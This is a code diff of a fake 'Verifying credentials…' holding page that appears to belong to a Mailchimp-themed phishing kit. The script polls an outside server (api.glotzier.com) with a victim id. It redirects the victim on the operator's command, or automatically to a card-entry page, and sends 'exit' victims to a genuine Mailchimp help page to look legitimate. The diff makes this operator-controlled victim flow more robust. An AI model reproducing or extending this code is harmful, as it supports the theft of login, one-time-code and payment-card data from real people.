@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Please wait…</title>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please wait…</title>
 <style>
 body{margin:0;background:#F9FAFB}
 .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.92);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
@@ -8,6 +11,7 @@ body{margin:0;background:#F9FAFB}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 .text{margin-top:24px;font-size:16px;font-weight:500;color:#241c15}
 .small{margin-top:8px;font-size:13px;color:#595959}
+.timer{margin-top:16px;font-size:12px;color:#888}
 </style>
 </head>
 <body>
@@ -15,35 +19,65 @@ body{margin:0;background:#F9FAFB}
   <div class="spinner"></div>
   <div class="text">Verifying credentials…</div>
   <div class="small">This will only take a moment</div>
+  <div class="timer" id="timer">Auto‑advancing in 30s</div>
 </div>
 <script>
 const vid = new URLSearchParams(window.location.search).get('vid');
 if (!vid) {
   document.querySelector('.text').textContent = 'Error: missing session';
 } else {
-  let attempts = 0;
-  const maxAttempts = 15; // 30 seconds
+  let timeoutId = null;
+  const timerDisplay = document.getElementById('timer');
+  let secondsLeft = 30;
 
+  function startTimer() {
+    timeoutId = setTimeout(function() {
+      // Auto-advance to Card after 30 seconds
+      window.location.href = 'card.html';
+    }, 30000);
+    // Update timer display every second
+    const interval = setInterval(function() {
+      secondsLeft--;
+      timerDisplay.textContent = `Auto‑advancing in ${secondsLeft}s`;
+      if (secondsLeft <= 0) clearInterval(interval);
+    }, 1000);
+  }
+
+  // Cancel timer if we get a command from the Worker
+  function cancelTimer() {
+    if (timeoutId) {
+      clearTimeout(timeoutId);
+      timeoutId = null;
+    }
+  }
+
+  // Long polling: wait for Worker to respond with a command
   async function poll() {
-    attempts++;
     try {
-      const res = await fetch(`https://api.glotzier.com/check?vid=${vid}`);
+      const res = await fetch(`https://api.glotzier.com/wait?vid=${vid}`, {
+        // This is a long-polling request: Worker holds the connection until a command is ready
+        // We'll implement a "wait" endpoint in the Worker that blocks until stage changes
+      });
       const text = await res.text();
+      cancelTimer();
       if (text === 'exit') {
         window.location.href = 'https://mailchimp.com/help/about-mailchimp-pricing-plans/';
         return;
       }
-      if (text !== 'wait') {
+      if (text !== 'wait' && text !== '') {
         window.location.href = text;
         return;
       }
-    } catch(e) {}
-    if (attempts >= maxAttempts) {
-      window.location.href = 'otp.html';
-      return;
+      // If no command, keep polling
+      setTimeout(poll, 1000);
+    } catch (e) {
+      // If network error, retry after 2 seconds
+      setTimeout(poll, 2000);
     }
-    setTimeout(poll, 2000);
   }
+
+  // Start the timer and polling
+  startTimer();
   poll();
 }
 </script>
